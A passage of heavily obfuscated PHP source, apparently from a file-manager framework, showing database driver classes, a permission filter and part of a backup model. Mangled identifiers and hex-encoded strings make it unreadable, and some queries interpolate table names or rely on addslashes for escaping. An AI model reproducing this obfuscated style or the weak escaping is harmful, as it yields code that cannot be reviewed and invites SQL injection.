•ŒÓîÆ]; $ûç·“á‡ = parent::listData(); $êæ¤¯Ş„ = array_to_keyvalue($ûç·“á‡, $Â¶ºìÙ’[12], $Â¶ºìÙ’[1912]); return empty($êæ¤¯Ş„) ? 0 : max($êæ¤¯Ş„) + 1; } private function filterAuth(&$ÀìßÛÃÃ) { if (!$ÀìßÛÃÃ) { return; } $ÉÖš×…° = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $›ºİÙ£Ô = array(); foreach ($ÉÖš×…° as $×Ìãáßè) { if ($ÀìßÛÃÃ & $×Ìãáßè) { $›ºİÙ£Ô[] = $×Ìãáßè; } } if (in_array(self::AUTH_ROOT, $›ºİÙ£Ô)) { $ÀìßÛÃÃ = array_sum($ÉÖš×…°); return; } $ÂãğÀŠ‹ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($›ºİÙ£Ô as $×Ìãáßè) { if (isset($ÂãğÀŠ‹[$×Ìãáßè])) { $›ºİÙ£Ô = array_merge($›ºİÙ£Ô, $ÂãğÀŠ‹[$×Ìãáßè]); } } $›ºİÙ£Ô[] = self::AUTH_SHOW; $ÀìßÛÃÃ = array_sum(array_unique($›ºİÙ£Ô)); } public function sort($œ–Ù¬, $â’Şô˜) { return parent::update($œ–Ù¬, $â’Şô˜); } } goto c‘¿Šá; Eğ„„†¡™ë: class DbMysqli extends Db { public function __construct($–Êİùëë = '') { $”‘½¿öª =& $_SERVER[ •ŒÓîÆ]; if (!extension_loaded($”‘½¿öª[953])) { think_exception(think_lang($”‘½¿öª[14]) . $”‘½¿öª[954]); } if (!empty($–Êİùëë)) { $this->config = $–Êİùëë; if (empty($this->config[$”‘½¿öª[17]])) { $this->config[$”‘½¿öª[17]] = $”‘½¿öª[12]; } } } public function connect($×ÄÄç¯ = '', $ÚêïĞäÊ = 0) { $ûÚ·Ÿ„ =& $_SERVER[ •ŒÓîÆ]; if (!isset($this->linkID[$ÚêïĞäÊ])) { if (empty($×ÄÄç¯)) { $×ÄÄç¯ = $this->config; } $this->linkID[$ÚêïĞäÊ] = new mysqli($×ÄÄç¯[$ûÚ·Ÿ„[927]], $×ÄÄç¯[$ûÚ·Ÿ„[929]], $×ÄÄç¯[$ûÚ·Ÿ„[930]], $×ÄÄç¯[$ûÚ·Ÿ„[21]], $×ÄÄç¯[$ûÚ·Ÿ„[928]] ? intval($×ÄÄç¯[$ûÚ·Ÿ„[928]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $…ÍÒîŠ = $this->linkID[$ÚêïĞäÊ]->server_version; $this->linkID[$ÚêïĞäÊ]->query($ûÚ·Ÿ„[931] . think_config($ûÚ·Ÿ„[932]) . $ûÚ·Ÿ„[58]); if ($…ÍÒîŠ > $ûÚ·Ÿ„[933]) { $this->linkID[$ÚêïĞäÊ]->query($ûÚ·Ÿ„[934]); } $this->connected = !0; if (1 != think_config($ûÚ·Ÿ„[22])) { unset($this->config); } } return $this->linkID[$ÚêïĞäÊ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($õÔÆçÍ€) { $ÄıúêÇà =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $õÔÆçÍ€; if ($this->queryID) { $this->free(); } think_action_status($ÄıúêÇà[23], 1); think_status($ÄıúêÇà[24]); $this->queryID = $this->_linkID->query($õÔÆçÍ€); if ($this->_linkID->more_results()) { while (($ÉÒØÎËÕ = $this->_linkID->next_result()) != NULL) { $ÉÒØÎËÕ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ûüæ½•ä) { $Ì§®àİÓ =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ûüæ½•ä; if ($this->queryID) { $this->free(); } think_action_status($Ì§®àİÓ[25], 1); think_status($Ì§®àİÓ[24]); $ëÚ‚õÂŠ = $this->_linkID->query($Ûüæ½•ä); $this->debug(); if (!1 === $ëÚ‚õÂŠ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $å¦Å±¿Ä = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$å¦Å±¿Ä) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $“ô¥Úı„ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$“ô¥Úı„) { $this->error(); return !1; } } return !0; } private function getAll() { $”ëÊÛÀ¨ = array(); if ($this->numRows > 0) { for ($úË‘¿Ç„ = 0; $úË‘¿Ç„ < $this->numRows; $úË‘¿Ç„++) { $”ëÊÛÀ¨[$úË‘¿Ç„] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $”ëÊÛÀ¨; } public function getFields($¿©“Ê²) { $ñÎ ¦Ù  =& $_SERVER[ •ŒÓîÆ]; $õ„ìİÖñ = $this->query($ñÎ ¦Ù [938] . $this->parseKey($¿©“Ê²)); $öƒÔ¢ Œ = array(); if ($õ„ìİÖñ) { foreach ($õ„ìİÖñ as $óãùÇ§˜ => $«³âïŒ ) { $öƒÔ¢ Œ[$«³âïŒ [$ñÎ ¦Ù [31]]] = array($ñÎ ¦Ù [32] => $«³âïŒ [$ñÎ ¦Ù [31]], $ñÎ ¦Ù [33] => $«³âïŒ [$ñÎ ¦Ù [34]], $ñÎ ¦Ù [35] => (bool) ($«³âïŒ [$ñÎ ¦Ù [36]] === $ñÎ ¦Ù [12]), $ñÎ ¦Ù [37] => $«³âïŒ [$ñÎ ¦Ù [38]], $ñÎ ¦Ù [39] => strtolower($«³âïŒ [$ñÎ ¦Ù [40]]) == $ñÎ ¦Ù [41], $ñÎ ¦Ù [42] => strtolower($«³âïŒ [$ñÎ ¦Ù [43]]) == $ñÎ ¦Ù [44]); } } return $öƒÔ¢ Œ; } public function getTables($†ÄÒÊ = '') { $Ø®èƒÑ =& $_SERVER[ •ŒÓîÆ]; $™¹åÛã™ = !empty($†ÄÒÊ) ? $Ø®èƒÑ[940] . $†ÄÒÊ . $Ø®èƒÑ[941] : $Ø®èƒÑ[942]; $•úÔ®À = $this->query($™¹åÛã™); $æ£¾¡¥¸ = array(); if ($•úÔ®À) { foreach ($•úÔ®À as $ÆÓäûÉö => $êöö¤º) { $æ£¾¡¥¸[$ÆÓäûÉö] = current($êöö¤º); } } return $æ£¾¡¥¸; } public function replace($à†–ï“Ø, $ÖÌ÷¡ö† = array()) { $×†…ú·ó =& $_SERVER[ •ŒÓîÆ]; foreach ($à†–ï“Ø as $ø©ÏÍ˜ => $ÎİŞ»”¦) { $ÃàŸßÀÌ = $this->parseValue($ÎİŞ»”¦); if (is_scalar($ÃàŸßÀÌ)) { $¯ÂË¦©¶[] = $ÃàŸßÀÌ; $Šò®°ª×[] = $this->parseKey($ø©ÏÍ˜); } } $ö¯äßÔ™ = $×†…ú·ó[943] . $this->parseTable($ÖÌ÷¡ö†[$×†…ú·ó[334]]) . $×†…ú·ó[944] . implode($×†…ú·ó[50], $Šò®°ª×) . $×†…ú·ó[945] . implode($×†…ú·ó[50], $¯ÂË¦©¶) . $×†…ú·ó[946]; return $this->execute($ö¯äßÔ™); } public function insertAll($û™ìÕÆ­, $ºæËÖÔş = array(), $„Ë°Æû¤ = false) { $ğ–Ë®ğ =& $_SERVER[ •ŒÓîÆ]; if (!is_array($û™ìÕÆ­[0])) { return !1; } $±ŠÌÆõ = array_keys($û™ìÕÆ­[0]); $––âõÛ¡ = array(); foreach ($û™ìÕÆ­ as $¥¨Õ±‚ç) { $¹‚ˆƒÔ¶ = array(); foreach ($¥¨Õ±‚ç as $ÍÅºôğ“ => $Æ¼ü»£») { $Æ¼ü»£» = $this->parseValue($Æ¼ü»£»); if (is_scalar($Æ¼ü»£»)) { $¹‚ˆƒÔ¶[] = $Æ¼ü»£»; } } $––âõÛ¡[] = $ğ–Ë®ğ[315] . implode($ğ–Ë®ğ[50], $¹‚ˆƒÔ¶) . $ğ–Ë®ğ[946]; } array_walk($±ŠÌÆõ, array($this, $ğ–Ë®ğ[947])); $±İœ¥ğí = $„Ë°Æû¤ ? $ğ–Ë®ğ[948] : $ğ–Ë®ğ[949]; $Äøšíïç = $±İœ¥ğí . $ğ–Ë®ğ[950] . $this->parseTable($ºæËÖÔş[$ğ–Ë®ğ[334]]) . $ğ–Ë®ğ[944] . implode($ğ–Ë®ğ[50], $±ŠÌÆõ) . $ğ–Ë®ğ[951] . implode($ğ–Ë®ğ[50], $––âõÛ¡); return $this->execute($Äøšíïç); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $èßƒ˜Ô’ =& $_SERVER[ •ŒÓîÆ]; $this->error = $this->_linkID->errno . $èßƒ˜Ô’[4] . $this->_linkID->error; if ($èßƒ˜Ô’[12] != $this->queryStr) { $this->error .= LNG($èßƒ˜Ô’[48]) . $this->queryStr; } think_trace($this->error, $èßƒ˜Ô’[12], $èßƒ˜Ô’[49]); return $this->error; } public function escapeString($Œ‘Ä‘ø€) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Œ‘Ä‘ø€); } else { return addslashes($Œ‘Ä‘ø€); } } public function parseKey(&$ï™ìÓÌ , $¤‡ĞŒö• = true) { $Ñü¬ˆ¶ =& $_SERVER[ •ŒÓîÆ]; if ($¤‡ĞŒö•) { $ï™ìÓÌ  = $this->parseKeyCheck($ï™ìÓÌ ); } if ($ï™ìÓÌ  != $Ñü¬ˆ¶[205] && !preg_match($Ñü¬ˆ¶[952], $ï™ìÓÌ )) { $ï™ìÓÌ  = $Ñü¬ˆ¶[439] . trim($ï™ìÓÌ , $Ñü¬ˆ¶[439]) . $Ñü¬ˆ¶[439]; } return $ï™ìÓÌ ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ì¼é¥× = '') { $–ñ­¼öá =& $_SERVER[ •ŒÓîÆ]; if (!class_exists($–ñ­¼öá[955])) { think_exception(think_lang($–ñ­¼öá[14]) . $–ñ­¼öá[956]); } if (!empty($Ì¼é¥×)) { $this->config = $Ì¼é¥×; if (empty($this->config[$–ñ­¼öá[17]])) { $this->config[$–ñ­¼öá[17]] = array(); } } } public function connect($óÎéç« = '', $û¯°’ì = 0) { $ÉÕñÃ¸ =& $_SERVER[ •ŒÓîÆ]; if (!isset($this->linkID[$û¯°’ì])) { if (empty($óÎéç«)) { $óÎéç« = $this->config; } $óµ°‚£ş = !empty($óÎéç«[$ÉÕñÃ¸[17]][$ÉÕñÃ¸[18]]) ? $óÎéç«[$ÉÕñÃ¸[17]][$ÉÕñÃ¸[18]] : $this->pconnect; if ($óµ°‚£ş) { $óÎéç«[$ÉÕñÃ¸[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$û¯°’ì] = new PDO($óÎéç«[$ÉÕñÃ¸[957]], $óÎéç«[$ÉÕñÃ¸[929]], $óÎéç«[$ÉÕñÃ¸[930]], $óÎéç«[$ÉÕñÃ¸[17]]); } catch (PDOException $æì³àÄ—) { think_exception($æì³àÄ—->getMessage()); } $this->dbType = $this->_getDsnType($óÎéç«[$ÉÕñÃ¸[957]]); if (in_array($this->dbType, array($ÉÕñÃ¸[958], $ÉÕñÃ¸[959], $ÉÕñÃ¸[960], $ÉÕñÃ¸[961]))) { think_exception($ÉÕñÃ¸[962] . $this->dbType . $ÉÕñÃ¸[963] . $this->dbType . $ÉÕñÃ¸[964]); } if (!$this->linkID[$û¯°’ì]) { think_exception($ÉÕñÃ¸[965]); } try { $this->linkID[$û¯°’ì]->exec($ÉÕñÃ¸[966] . think_config($ÉÕñÃ¸[932])); } catch (Exception $æì³àÄ—) { } $this->connected = !0; if (1 != think_config($ÉÕñÃ¸[22])) { unset($this->config); } } return $this->linkID[$û¯°’ì]; } public function free() { $this->PDOStatement = null; } public function query($´Ó™à°æ, $œ—ãÉöÎ = array()) { $ï™ª‡ÁÊ =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $´Ó™à°æ; if (!empty($œ—ãÉöÎ)) { $this->queryStr .= $ï™ª‡ÁÊ[967] . print_r($œ—ãÉöÎ, !0) . $ï™ª‡ÁÊ[968]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ï™ª‡ÁÊ[23], 1); think_status($ï™ª‡ÁÊ[24]); $this->PDOStatement = $this->_linkID->prepare($´Ó™à°æ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $öàÆÅë = $this->PDOStatement->execute($œ—ãÉöÎ); $this->debug(); if (!1 === $öàÆÅë) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ßå““Ç€, $éü•éŠÆ = array()) { $şâ©É„ =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ßå““Ç€; if (!empty($éü•éŠÆ)) { $this->queryStr .= $şâ©É„[967] . print_r($éü•éŠÆ, !0) . $şâ©É„[968]; } $ëÙ‹ªğ… = !1; if ($this->dbType == $şâ©É„[961]) { if (preg_match($şâ©É„[969], $this->queryStr, $Ò€Õ±Ô©)) { $this->table = think_config($şâ©É„[970]) . str_ireplace(think_config($şâ©É„[971]), $şâ©É„[263], $Ò€Õ±Ô©[2]); $ëÙ‹ªğ… = (bool) $this->query($şâ©É„[972] . strtoupper($this->table) . $şâ©É„[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($şâ©É„[25], 1); think_status($şâ©É„[24]); $this->PDOStatement = $this->_linkID->prepare($ßå““Ç€); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $µ“ê—ğ¯ = $this->PDOStatement->execute($éü•éŠÆ); $this->debug(); if (!1 === $µ“ê—ğ¯) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ëÙ‹ªğ… || preg_match($şâ©É„[973], $ßå““Ç€)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ëáù¾æ• = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ëáù¾æ•) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $†î½«Í‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$†î½«Í‡) { $this->error(); return !1; } } return !0; } private function getAll() { $ãºõÉÌó = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ãºõÉÌó); return $ãºõÉÌó; } public function getFields($­¿ÖÓÇö) { $ß¾’¿•² =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!0); if (think_config($ß¾’¿•²[974])) { $“ïßş¾ = str_replace($ß¾’¿•²[975], $­¿ÖÓÇö, think_config($ß¾’¿•²[974])); } else { switch ($this->dbType) { case $ß¾’¿•²[958]: case $ß¾’¿•²[976]: $“ïßş¾ = "\x53\105\x4c\x45\103\124\40\x20\x20\143\x6f\x6c\165\x6d\x6e\x5f\x6e\x61\x6d\x65\x20\x61\x73\x20\47\116\141\x6d\145\47\54\x20\40\x20\x64\141\x74\x61\137\164\171\x70\145\x20\x61\163\x20\47\x54\x79\160\x65\47\x2c\40\x20\40\143\x6f\154\x75\155\x6e\x5f\x64\x65\146\x61\165\x6c\164\x20\141\x73\40\47\x44\x65\x66\141\x75\154\164\x27\54\x20\40\40\151\x73\x5f\156\165\154\x6c\x61\142\154\145\x20\141\x73\40\47\x4e\x75\x6c\x6c\x27\xa\11\x9\x46\x52\117\115\x9\x69\156\146\157\162\155\141\164\x69\157\x6e\x5f\163\x63\150\x65\x6d\x61\56\164\x61\142\x6c\x65\x73\x20\x41\x53\40\164\xa\11\x9\x4a\117\x49\116\x9\x69\156\146\157\x72\x6d\x61\x74\151\x6f\x6e\137\x73\143\x68\145\155\141\x2e\143\x6f\x6c\x75\x6d\156\163\x20\101\123\x20\143\12\11\11\117\116\40\40\164\x2e\x74\141\x62\154\145\137\x63\x61\x74\x61\x6c\157\147\x20\75\x20\143\x2e\x74\x61\x62\x6c\x65\137\x63\141\164\x61\154\x6f\x67\xa\11\11\x41\116\x44\40\x74\x2e\x74\x61\x62\x6c\x65\137\163\x63\150\x65\155\141\x20\x3d\40\x63\56\164\x61\x62\x6c\145\137\x73\143\150\x65\x6d\x61\xa\x9\11\x41\x4e\x44\x20\x74\x2e\x74\x61\x62\x6c\x65\x5f\x6e\141\155\x65\x20\75\x20\x63\56\164\x61\142\x6c\145\x5f\156\141\155\145\xa\x9\x9\127\x48\105\x52\105\x20\40\40\x74\x2e\x74\x61\x62\x6c\145\137\x6e\x61\155\x65\x20\x3d\x20\47{$­¿ÖÓÇö}\x27"; break; case $ß¾’¿•²[977]: $“ïßş¾ = $ß¾’¿•²[978] . $­¿ÖÓÇö . $ß¾’¿•²[979]; break; case $ß¾’¿•²[959]: case $ß¾’¿•²[961]: $“ïßş¾ = $ß¾’¿•²[980] . $ß¾’¿•²[981] . $ß¾’¿•²[982] . strtoupper($­¿ÖÓÇö) . $ß¾’¿•²[983] . strtoupper($­¿ÖÓÇö) . $ß¾’¿•²[984]; break; case $ß¾’¿•²[985]: $“ïßş¾ = $ß¾’¿•²[986] . $­¿ÖÓÇö . $ß¾’¿•²[987]; break; case $ß¾’¿•²[960]: break; case $ß¾’¿•²[988]: default: $“ïßş¾ = $ß¾’¿•²[989] . ($this->dbType == $ß¾’¿•²[988] ? "\140{$­¿ÖÓÇö}\x60" : $­¿ÖÓÇö); } } $…ÉÊ¼œ´ = $this->query($“ïßş¾); $Òšˆ§ƒø = array(); if ($…ÉÊ¼œ´) { foreach ($…ÉÊ¼œ´ as $©ºî ¬ => $·®íƒ½Ç) { $·®íƒ½Ç = array_change_key_case($·®íƒ½Ç); $·®íƒ½Ç[$ß¾’¿•²[32]] = isset($·®íƒ½Ç[$ß¾’¿•²[32]]) ? $·®íƒ½Ç[$ß¾’¿•²[32]] : $ß¾’¿•²[263]; $·®íƒ½Ç[$ß¾’¿•²[33]] = isset($·®íƒ½Ç[$ß¾’¿•²[33]]) ? $·®íƒ½Ç[$ß¾’¿•²[33]] : $ß¾’¿•²[263]; $—’®Ú¾ = isset($·®íƒ½Ç[$ß¾’¿•²[328]]) ? $·®íƒ½Ç[$ß¾’¿•²[328]] : $·®íƒ½Ç[$ß¾’¿•²[32]]; $Òšˆ§ƒø[$—’®Ú¾] = array($ß¾’¿•²[32] => $—’®Ú¾, $ß¾’¿•²[33] => $·®íƒ½Ç[$ß¾’¿•²[33]], $ß¾’¿•²[35] => (bool) (isset($·®íƒ½Ç[$ß¾’¿•²[105]]) && $·®íƒ½Ç[$ß¾’¿•²[105]] === $ß¾’¿•²[12] || isset($·®íƒ½Ç[$ß¾’¿•²[35]]) && $·®íƒ½Ç[$ß¾’¿•²[35]] === $ß¾’¿•²[12]), $ß¾’¿•²[37] => isset($·®íƒ½Ç[$ß¾’¿•²[37]]) ? $·®íƒ½Ç[$ß¾’¿•²[37]] : (isset($·®íƒ½Ç[$ß¾’¿•²[56]]) ? $·®íƒ½Ç[$ß¾’¿•²[56]] : $ß¾’¿•²[263]), $ß¾’¿•²[39] => isset($·®íƒ½Ç[$ß¾’¿•²[96]]) ? strtolower($·®íƒ½Ç[$ß¾’¿•²[96]]) == $ß¾’¿•²[41] : (isset($·®íƒ½Ç[$ß¾’¿•²[57]]) ? $·®íƒ½Ç[$ß¾’¿•²[57]] : !1), $ß¾’¿•²[42] => isset($·®íƒ½Ç[$ß¾’¿•²[990]]) ? strtolower($·®íƒ½Ç[$ß¾’¿•²[990]]) == $ß¾’¿•²[44] : (isset($·®íƒ½Ç[$ß¾’¿•²[96]]) ? $·®íƒ½Ç[$ß¾’¿•²[96]] : !1)); } } return $Òšˆ§ƒø; } public function getTables($ª¶©õÇ« = '') { $Ëº¯ïí® =& $_SERVER[ •ŒÓîÆ]; if (think_config($Ëº¯ïí®[991])) { $ÓÁàŠ¦ = str_replace($Ëº¯ïí®[992], $ª¶©õÇ«, think_config($Ëº¯ïí®[991])); } else { switch ($this->dbType) { case $Ëº¯ïí®[959]: case $Ëº¯ïí®[961]: $ÓÁàŠ¦ = $Ëº¯ïí®[993]; break; case $Ëº¯ïí®[958]: case $Ëº¯ïí®[976]: $ÓÁàŠ¦ = $Ëº¯ïí®[994]; break; case $Ëº¯ïí®[985]: $ÓÁàŠ¦ = $Ëº¯ïí®[995]; break; case $Ëº¯ïí®[960]: think_exception(think_lang($Ëº¯ïí®[996]) . $Ëº¯ïí®[997]); break; case $Ëº¯ïí®[977]: $ÓÁàŠ¦ = $Ëº¯ïí®[45] . $Ëº¯ïí®[46] . $Ëº¯ïí®[47]; break; case $Ëº¯ïí®[988]: default: if (!empty($ª¶©õÇ«)) { $ÓÁàŠ¦ = $Ëº¯ïí®[940] . $ª¶©õÇ« . $Ëº¯ïí®[941]; } else { $ÓÁàŠ¦ = $Ëº¯ïí®[942]; } } } $©ª×ùÅ = $this->query($ÓÁàŠ¦); $æœ­ş· = array(); foreach ($©ª×ùÅ as $İªˆŞ· => $ ïÚó™—) { $æœ­ş·[$İªˆŞ·] = current($ ïÚó™—); } return $æœ­ş·; } protected function parseLimit($Şë·‡¬Â) { $íÒåŠ§ =& $_SERVER[ •ŒÓîÆ]; $°õÑŸ„€ = $íÒåŠ§[12]; if (!empty($Şë·‡¬Â)) { switch ($this->dbType) { case $íÒåŠ§[985]: case $íÒåŠ§[977]: $Şë·‡¬Â = explode($íÒåŠ§[50], $Şë·‡¬Â); if (count($Şë·‡¬Â) > 1) { $°õÑŸ„€ .= $íÒåŠ§[51] . $Şë·‡¬Â[1] . $íÒåŠ§[52] . $Şë·‡¬Â[0] . $íÒåŠ§[53]; } else { $°õÑŸ„€ .= $íÒåŠ§[51] . $Şë·‡¬Â[0] . $íÒåŠ§[53]; } break; case $íÒåŠ§[958]: case $íÒåŠ§[976]: break; case $íÒåŠ§[960]: break; case $íÒåŠ§[959]: case $íÒåŠ§[961]: break; case $íÒåŠ§[988]: default: $°õÑŸ„€ .= $íÒåŠ§[51] . $Şë·‡¬Â . $íÒåŠ§[53]; } } return $°õÑŸ„€; } public function parseKey(&$®ç¼Ôû, $èŞ–Ò = true) { $„Ù¡Ìïâ =& $_SERVER[ •ŒÓîÆ]; if ($èŞ–Ò) { $®ç¼Ôû = $this->parseKeyCheck($®ç¼Ôû); } if ($this->dbType == $„Ù¡Ìïâ[988]) { if ($®ç¼Ôû != $„Ù¡Ìïâ[205] && !preg_match($„Ù¡Ìïâ[952], $®ç¼Ôû)) { $®ç¼Ôû = $„Ù¡Ìïâ[439] . trim($®ç¼Ôû, $„Ù¡Ìïâ[439]) . $„Ù¡Ìïâ[439]; } return $®ç¼Ôû; } else { return parent::parseKey($®ç¼Ôû, $èŞ–Ò); } } public function close() { $this->_linkID = null; } public function error() { $¤°ˆñü =& $_SERVER[ •ŒÓîÆ]; if ($this->PDOStatement) { $òøçºÜ = $this->PDOStatement->errorInfo(); $this->error = $òøçºÜ[1] . $¤°ˆñü[4] . $òøçºÜ[2]; } else { $this->error = $¤°ˆñü[12]; } if ($¤°ˆñü[12] != $this->queryStr) { $this->error .= LNG($¤°ˆñü[48]) . $this->queryStr; } think_trace($this->error, $¤°ˆñü[12], $¤°ˆñü[49]); return $this->error; } public function escapeString($øóÏüİö) { $§â­ãîŸ =& $_SERVER[ •ŒÓîÆ]; switch ($this->dbType) { case $§â­ãîŸ[985]: case $§â­ãîŸ[958]: case $§â­ãîŸ[976]: case $§â­ãîŸ[988]: return addslashes($øóÏüİö); case $§â­ãîŸ[960]: case $§â­ãîŸ[977]: case $§â­ãîŸ[959]: case $§â­ãîŸ[961]: return str_ireplace($§â­ãîŸ[58], $§â­ãîŸ[59], $øóÏüİö); } } protected function parseValue($»´‹µı ) { $›Ø­Ü­à =& $_SERVER[ •ŒÓîÆ]; if (is_string($»´‹µı )) { $Â»ØƒÉ = strpos($»´‹µı , $›Ø­Ü­à[4]) === 0 && in_array($»´‹µı , array_keys($this->bind)); $»´‹µı  = $Â»ØƒÉ ? $this->escapeString($»´‹µı ) : $›Ø­Ü­à[998] . $this->escapeString($»´‹µı ) . $›Ø­Ü­à[998]; } elseif (isset($»´‹µı [0]) && is_string($»´‹µı [0]) && strtolower($»´‹µı [0]) == $›Ø­Ü­à[352]) { $»´‹µı  = $this->escapeString($»´‹µı [1]); } elseif (is_array($»´‹µı )) { $»´‹µı  = array_map(array($this, $›Ø­Ü­à[999]), $»´‹µı ); } elseif (is_bool($»´‹µı )) { $»´‹µı  = $»´‹µı  ? $›Ø­Ü­à[90] : $›Ø­Ü­à[214]; } elseif (is_null($»´‹µı )) { $»´‹µı  = $›Ø­Ü­à[105]; } return $»´‹µı ; } public function getLastInsertId() { $è–áÎş =& $_SERVER[ •ŒÓîÆ]; switch ($this->dbType) { case $è–áÎş[985]: case $è–áÎş[977]: case $è–áÎş[958]: case $è–áÎş[976]: case $è–áÎş[960]: case $è–áÎş[988]: return $this->_linkID->lastInsertId(); case $è–áÎş[959]: case $è–áÎş[961]: $–ÎÍ¾— = $this->table; $ÎÂÍ°µç = $this->query("\x53\105\x4c\x45\103\x54\40{$–ÎÍ¾—}\x2e\x63\165\x72\x72\x76\141\154\x20\x63\x75\x72\162\x76\141\154\40\106\122\117\115\x20\x64\x75\141\154"); return $ÎÂÍ°µç ? $ÎÂÍ°µç[0][$è–áÎş[1000]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ì­»ùá) { $ÖÕÖ¨¼¸ =& $_SERVER[ •ŒÓîÆ]; if (!CacheLock::fileLock($ÖÕÖ¨¼¸[13])) { return !1; } $Ù«ˆ«ç¨ = parent::query($ì­»ùá); CacheLock::fileUnLock($ÖÕÖ¨¼¸[13]); return $Ù«ˆ«ç¨; } public function execute($ª©—™ø) { $¹İÄ»øĞ =& $_SERVER[ •ŒÓîÆ]; if (!CacheLock::fileLock($¹İÄ»øĞ[13])) { return !1; } $×¶‹Å²ƒ = parent::execute($ª©—™ø); CacheLock::fileUnLock($¹İÄ»øĞ[13]); return $×¶‹Å²ƒ; } } goto e™ğŠ¾ÇË²; c‘¿Šá: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\142\x61\143\153\x75\x70\114\151\163\x74"; public $field = array("\x69\157", "\x6e\x61\155\x65", "\163\164\141\x74\165\x73", "\x63\x6f\x6e\164\x65\x6e\164", "\x6d\x61\156\x75\141\x6c", "\x72\145\163\165\x6c\x74", "\x74\151\x6d\145\x46\x72\x6f\x6d", "\164\151\x6d\x65\124\157"); public function config() { $öÑöÎá“ =& $_SERVER[ •ŒÓîÆ]; $Ôï¡ˆßæ = Model($öÑöÎá“[811])->get($öÑöÎá“[821]); $Ôï¡ˆßæ = json_decode($Ôï¡ˆßæ, !0); $Ôï¡ˆßæ = is_array($Ôï¡ˆßæ) ? $Ôï¡ˆßæ : array(); if (!isset($Ôï¡ˆßæ[$öÑöÎá“[795]])) { $Ôï¡ˆßæ[$öÑöÎá“[795]] = $öÑöÎá“[90]; } unset($Ôï¡ˆßæ[$öÑöÎá“[1660]]); Action($öÑöÎá“[1913])->taskInit(); Model($öÑöÎá“[1659])->cacheClear(); $‚•å¸÷ˆ = $öÑöÎá“[1914]; $Ëç´áÎ™ = Model($öÑöÎá“[1915])->findByKey($öÑöÎá“[1678], $‚•å¸÷ˆ); if (!$Ëç´áÎ™) { $Ëç´áÎ™ = array(); } if (isset($Ëç´áÎ™[$öÑöÎá“[196]])) { $Ëç´áÎ™[$öÑöÎá“[196]] = json_decode($Ëç´áÎ™[$öÑöÎá“[196]], !0); } if (isset($Ôï¡ˆßæ[$öÑöÎá“[196]])) { $Ëç´áÎ™[$öÑöÎá“[196]][$öÑöÎá“[1663]] = $Ôï¡ˆßæ[$öÑöÎá“[196]]; unset($Ôï¡ˆßæ[$öÑöÎá“[196]]); } return array_merge($Ëç´áÎ™, $Ôï¡ˆßæ); } public function listData($õ…ì×ú = false, $¡Ç¿š‚Ë = "\155\157\x64\x69\x66\171\x54\151\x6d\x65", $–¶€õ˜û = false) { return parent::listData($õ…ì×ú, $¡Ç¿š‚Ë, !0); } public function lastItem() { $ôÁ—ÄÛ = $this->listData(); return !empty($ôÁ—ÄÛ[0]) ? $ôÁ—ÄÛ[0] : null; } public function kill($ÊúÓ¿ã“) { $ÇßÆê¸ =& $_SERVER[ •ŒÓîÆ]; $ëèÔ‰òÑ = $this->listData($ÊúÓ¿ã“); if (!$ëèÔ‰òÑ || empty($ëèÔ‰òÑ[$ÇßÆê¸[32]])) { return !0; } Task::kill($ÇßÆê¸[820]); Task::kill($ÇßÆê¸[841]); Task::kill($ÇßÆê¸[850]); $Ñ—Û¬Ù = $ëèÔ‰òÑ[$ÇßÆê¸[32]]; $‡å¬ê = TEMP_FILES . 